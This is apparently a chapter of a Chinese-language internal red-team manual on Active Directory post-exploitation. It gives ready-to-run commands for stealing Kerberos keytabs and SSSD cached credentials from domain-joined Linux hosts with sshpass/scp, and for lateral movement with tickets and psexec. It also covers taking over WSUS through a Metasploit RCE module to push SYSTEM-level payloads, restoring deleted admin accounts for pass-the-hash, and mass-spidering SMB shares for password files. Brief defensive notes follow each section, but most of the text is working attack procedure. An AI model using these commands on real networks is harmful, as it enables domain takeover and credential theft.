# 域内 Linux 与补充面

> 域内跑服务的 Linux 宿主(发现 → keytab/SSSD/GSSAPI 凭据三源 → 提权回域闭环)+ 三个高价值补充面:WSUS 代谢攻击、AD 回收站复活、敏感文件定向。本文件工具:执行台「敏感文件定向搜索(file-hunt)/Linux 连接溯源(lin-trace)」+ impacket 全家 + 本机 msf(WSUS 模块实测在位)。

## 域内 Linux 机器 — 发现与凭据三源(keytab/SSSD/GSSAPI)

来源:kinit/klist 实测(Kerberos 5 1.22.1;`klist --help` 原文含 `-k specifies keytab`,`-t`/`-K` 选项在位);impacket-getTGT -h 实测(v0.14.0.dev0,**无 -kt/keytab 参数**);`ssh -o GSSAPIAuthentication=yes -G` 实测本机 ssh 构建不支持;python3 `import ldb` 实测在位(2.11.0);`nxc smb --help` 实测**无 --os 开关**

### 发现:哪些 Linux 加了域

```bash
# ① 端口面:全段 22 + 服务指纹(域内 Linux 多为跑服务的老宿主,banner 直接露发行版)
nmap -p 22 -sV --script ssh-auth-methods <网段>/24
# ② LDAP 面(权威):computer 对象的 operatingSystem 属性一次翻出所有非 Windows 机器
ldapsearch -x -H ldap://<域控IP> -D '<域>\<用户>' -w '<密码>' -b 'DC=test,DC=local' \
  '(operatingSystem=Linux)' name operatingSystem dnshostname     # Ubuntu/SUSE 等换值同法
# ③ SPN 面:加域(realm/adcli join,通用知识)默认给机器注册 HOST/<fqdn>、RestrictedKrbHost/<fqdn>
ldapsearch -x -H ldap://<域控IP> -D '<域>\<用户>' -w '<密码>' -b 'DC=test,DC=local' \
  '(servicePrincipalName=HOST/*)' name servicePrincipalName      # 可爆的机器 SPN 交 12 号 Kerberoast 节
# ④ 命中后目标机确认:realm list / ls -la /etc/krb5.keytab / systemctl status sssd
```

注意:nxc smb 实测无 `--os` 开关(OS 归类走 ② 的 LDAP 属性或 bloodhound-python computers.json 的 os 字段);Linux 侧无凭据枚举的等价思路总表见 22 号 §②。

### 凭据源 ① /etc/krb5.keytab — 机器账户钥匙(通用路径,root 可读)

```bash
# 目标机(root 后):看 keytab 里有哪些主体;密钥内容加 -K
klist -kt /etc/krb5.keytab              # 主体列表+时间戳;`klist -k -K` 连密钥(帮助原文实测)
# 拖回本机(lin-trace 同款 sshpass 通道;keytab 按 0600 敏感文件对待,用完即删)
sshpass -p '<root密码>' scp -o StrictHostKeyChecking=no root@<目标>:/etc/krb5.keytab ./web01.keytab
# 本机换票据:impacket-getTGT 实测无 -kt 参数 → keytab 必经 kinit 转 ccache(实测拼法)
kinit -kt ./web01.keytab 'HOST/web01.test.local@TEST.LOCAL' -c web01.ccache
KRB5CCNAME=web01.ccache klist                                          # 验票据
KRB5CCNAME=web01.ccache impacket-psexec -k -no-pass web01.test.local   # -k -no-pass 拼法同 12 号「票据获取、检视与传递」节
```

机器 TGT 的价值:机器账户对自己 computer 对象有属性写权 → 直接打 RBCD 接管(改 msDS-AllowedToActOnBehalfOfOtherIdentity 后 getST -impersonate),全链照 12 号「findDelegation 委托(RBCD 全链)」节打;对时/krb5.conf 前置同 12 号「Kerberos 环境准备」节。

注意(防御/审计):keytab=机器账户长期密钥,拖走即账户沦陷——应最小化 keytab 内主体、定期轮换机器口令(adcli update 思路);检测面:root 会话内对 /etc/krb5.keytab 的 scp/打包/异常读取。

### 凭据源 ② SSSD 缓存(通用路径;secrets.ldb 机制随版本 [待验证])

```bash
# 目标机枚举(root):配置文件常藏明文 bind 凭据(ldap 模式接入时)
cat /etc/sssd/sssd.conf                 # 找 ldap_default_bind_dn + ldap_default_authtok(明文密码)
ls -la /var/lib/sss/db/                 # cache_<域名>.ldb:用户/组属性缓存(通用路径)
ls -la /var/lib/sss/secrets.ldb         # 通用路径(约束内给定);键值结构标 [待验证]
# 提取思路(Linux 非 Windows,psexef 不适用):整目录拖回,本机结构化解析
sshpass -p '<密码>' scp -r -o StrictHostKeyChecking=no root@<目标>:/var/lib/sss/db ~/loot_sssdb/
python3 -c "import ldb; c=ldb.Ldb('~/loot_sssdb/cache_test.local.ldb'); [print(m) for m in c.search()]"   # import ldb 2.11.0 本机实测在位
strings ~/loot_sssdb/*.ldb | sort -u    # 兜底:缓存里的用户名/UPN/属性行
```

注意(防御):sssd.conf 应 0600 且用 keytab 而非明文 authtok;/var/lib/sss 权限收紧;泄露后的处置=轮换 bind 账户与机器口令(缓存不是票据,改密即废)。

### 凭据源 ③ SSH GSSAPI 免密链(服务器开 GSSAPIAuthentication 时)

```bash
# 前置:目标机 /etc/ssh/sshd_config 含 GSSAPIAuthentication yes(通用默认关)
# 链路:手里一张域用户 TGT → 不输密码直连域内任意开了 GSSAPI 的 Linux 宿主
kinit <域用户>@TEST.LOCAL
ssh -o GSSAPIAuthentication=yes <用户>@web01.test.local
# ⚠ 自检先行:本机 Kali ssh 构建实测报 Unsupported option "gssapiauthentication" →
ssh -o GSSAPIAuthentication=yes -G localhost   # 报错则本机构建不带 GSSAPI,换带 GSSAPI 的客户端构建[待验证]
```

注意(防御/审计):GSSAPI 免密=Kerberos 票据即 SSH 凭据,横向效率极高——非必要不开 GSSAPIAuthentication;检测面:sshd 日志 gssapi-with-mic 认证记录与来源主机比对。

### 提权到域闭环:sudo -l 与 NFS no_root_squash(思路)

```bash
sudo -l                        # 07 号「Linux 提权手工流程」第 1 步;域环境重点:%域 admins 等域组 NOPASSWD:ALL 误配
showmount -e <NFS服务器>        # 思路:exports 含 no_root_squash → 挂载后本地 root 写 SUID 二进制进 export,目标机执行即 root(通用老洞)
# root 之后回扫三源:krb5.keytab + SSSD 全到手 → 机器身份进域,闭环
```

注意:NFS 利用细节按目标发行版核(思路级);root 落地后必回三源;防御:exports 默认 root_squash、sudoers 域组最小化、`sudo -l` 输出纳入基线比对。

## WSUS 代谢攻击 — 更新服务器即全域 SYSTEM

来源:本机 msf 实测 `search wsus` 出 `exploit/windows/http/wsus_deserialization_rce`(CVE-2025-59287,Rank great,RPORT 8530,未认证反序列化,成功即 WSUS 服务管理员上下文,2025-10-14 披露);**检索坑:`search name:wsus` 搜不到,全文 `search wsus` 才出**;SharpWSUS 非本机工具

```bash
# ① 原理:WSUS 是内网 Windows 补丁的"代谢入口"——客户端周期(默认约 22h,通用值)拉更新并以 SYSTEM 安装;
#    接管 WSUS 服务器/其数据库 = 向全部下游客户端投递 SYSTEM 级代码(与 19 号 SCCM 同类管理面,更单点)
# ② 定位:任一沦陷域机查更新策略,注册表直指 WSUS 服务器
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /s    # WSUSServer 值即地址
# ③ 指纹(通用):TCP 8530(HTTP)/8531(HTTPS);GET /iuident.cab、/selfupdate 可达即 WSUS;
#    数据库 SUSDB,常在 WID(实例 MICROSOFT##WID,命名管道,通用名)或独立 SQL(14 号打法套用)
nmap -p 8530,8531 --script http-title <WSUS服务器>
# ④ 直打 RCE(本机 msf 实测在位,支持 check):
msfconsole -q -x 'use exploit/windows/http/wsus_deserialization_rce; show options; exit'
```

SharpWSUS(非本机,不虚构参数):官方语义按阶段走 **locate(定位库/版本)→ inspect(枚举更新/目标)→ create(构造指向 payload 的"本地更新")→ approve(批准到目标机组)→ checkin(等客户端拉取)→ status/cleanup(收尾删痕)**;参数拼写以官方 README 为准[非本机][待验证]。手动替代思路(已拿 WSUS 服务器管理员后):动 SUSDB 更新表改下载指向 [待验证——表结构未核];或干脆不推更新——WSUS 服务器本身就是高价值跳板(SYSTEM 可读 SUSDB,且是域成员,直接并入 10 号主线横向)。

注意(防御/检测):WSUS 先补自己(CVE-2025-59287 即 WSUS 自身 RCE);8531+证书校验;监控:WID/SQL 异常登录、新增或批准更新的管理操作、客户端 WindowsUpdate 日志"未知更新源"告警;把 WSUS 服务器当 Tier-0 资产管理。

## AD 回收站滥用 — 被删特权账户复活

来源:PowerShell 通用写法(本机无域控实例,以实例试跑为准);ldapsearch 通道同 22 号 §②

```powershell
# ① 是否启用(林级一次性开启;EnabledScopes 非空=已启用)
Get-ADOptionalFeature -Identity 'Recycle Bin Feature' -Properties EnabledScopes
# ② 翻回收站:被删对象 RDN 带 "DEL:" 前缀;保留原 SID、原密码哈希、lastKnownParent
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties msDS-LastKnownRDN,lastKnownParent,sAMAccountName |
  Where-Object {$_.msDS-LastKnownRDN -match 'admin|svc|sql|backup'}
# ③ 复活(需恢复权限,默认 DA 组可):恢复后旧 SID+旧密码哈希原样回归 → 台账里旧哈希立即复用
Get-ADObject -Filter 'msDS-LastKnownRDN -like "*svc-backup*"' -IncludeDeletedObjects | Restore-ADObject
```

滥用场景:①离职/被删管理员账户的 NT 哈希早前已入台账(26 号 §8 creds.csv)→ Restore 后 PTH 直接回域;②被删安全组的 SID 仍被 ACL 引用 → 恢复同 SID 组即重获权限(权限残留)。Linux 侧翻查:`ldapsearch -x ... '(isDeleted=TRUE)' sAMAccountName msDS-LastKnownRDN`(通用过滤器;恢复写操作走 PowerShell/ldapmodify [待验证])。

注意(防御):回收站=被删特权凭据的"冷冻库"——删除特权账户≠凭据失效,应同步清理其 SID 的 ACL 引用并把台账旧哈希标记失效;审计:恢复产生 5136(isDeleted 属性变更)、删除产生 5141,两类事件直接告警;定期导出"谁有 Restore 权限"做基线。

## 敏感文件定向 — spider_plus 递归 → 关键词复核 → 台账

来源:`nxc -M spider_plus --options` 实测:选项=DOWNLOAD_FLAG/STATS_FLAG/EXCLUDE_EXTS/EXCLUDE_FILTER/MAX_FILE_SIZE/OUTPUT_FOLDER,**无 PATTERN/ONLY_FILES**(关键词过滤必须下载后本地做);执行台 file-hunt 已按此注册

```bash
# ① 执行台「敏感文件定向搜索」一键(等价命令;DOWNLOAD_FLAG=True 才会拖文件实体):
nxc smb <网段>/24 -u <域用户> -p '<密码>' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=999kb EXCLUDE_EXTS=ico,lnk
#    产物:各机共享全量清单 JSON(默认 NXC_PATH/nxc_spider_plus/,执行台提示 loot 目录)+ 小文件实体
# ② 关键词复核(JSON 清单+下载实体一起过):
grep -riE '密码|pass|pwd|vpn|拓扑|topo|cred|backup|备份|账号|cisco|交换机|路由' ~/tools/loot*/spider_plus/ | head -50
# ③ 命中文件人工开箱清单:密码本(xlsx/txt)· KeePass(.kdbx)· VPN 配置(.vpn/.ovpn)·
#    Visio 拓扑(.vsd/.vsdx)· 网络设备配置(run.cfg/startup-config)· 备份压缩包(bak/zip/gho)
# ④ 本地盘(已落地机器)常见路径表:
#    Windows:where /r C:\ *.kdbx *.vsd *.ovpn  → 桌面/Downloads/C:\Temp/D:\backup/文件服务器共享
#    Linux:  find / \( -name '*.kdbx' -o -name '*.ovpn' \) 2>/dev/null → /home/*、/opt、/srv、/var/backups、/etc
# ⑤ 结论进台账(26 号 §8 收割后闭环):提取的账密先喷洒验证 → 命中后 log-cred.sh 入 creds.csv,
#    来源列写 spider_plus:<主机>:<文件>;文件本体按 26 号收尾清单随项目销毁,只留结论行
```

注意(审计/OPSEC):DOWNLOAD_FLAG=True 是批量读共享,留大量 5145(网络共享对象访问)审计——时间窗内做(21 号);MAX_FILE_SIZE 压小控流量(默认 51200 字节);下载实体按最高敏资产对待。
